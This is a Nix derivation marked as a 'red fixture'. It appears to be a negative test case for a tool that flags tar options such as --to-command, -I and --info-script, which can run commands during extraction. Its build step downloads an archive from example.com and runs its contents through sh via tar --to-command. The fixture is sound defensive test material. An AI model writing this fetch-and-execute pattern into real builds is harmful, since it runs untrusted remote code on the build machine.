# Red fixture: tar's --to-command (and -I/--use-compress-program,
# -F/--info-script, --new-volume-script, --rsh-command) can execute
# commands while extracting (eblume/blumeops#1809).
{ pkgs ? import <nixpkgs> { } }:

pkgs.runCommand "tar-to-command" {
  outputHash = "sha256-0000000000000000000000000000000000000000000000000000000000000000=";
} ''
  curl -sSLo s.tar.gz https://example.com/s.tar.gz
  tar -xf s.tar.gz --to-command=sh
''
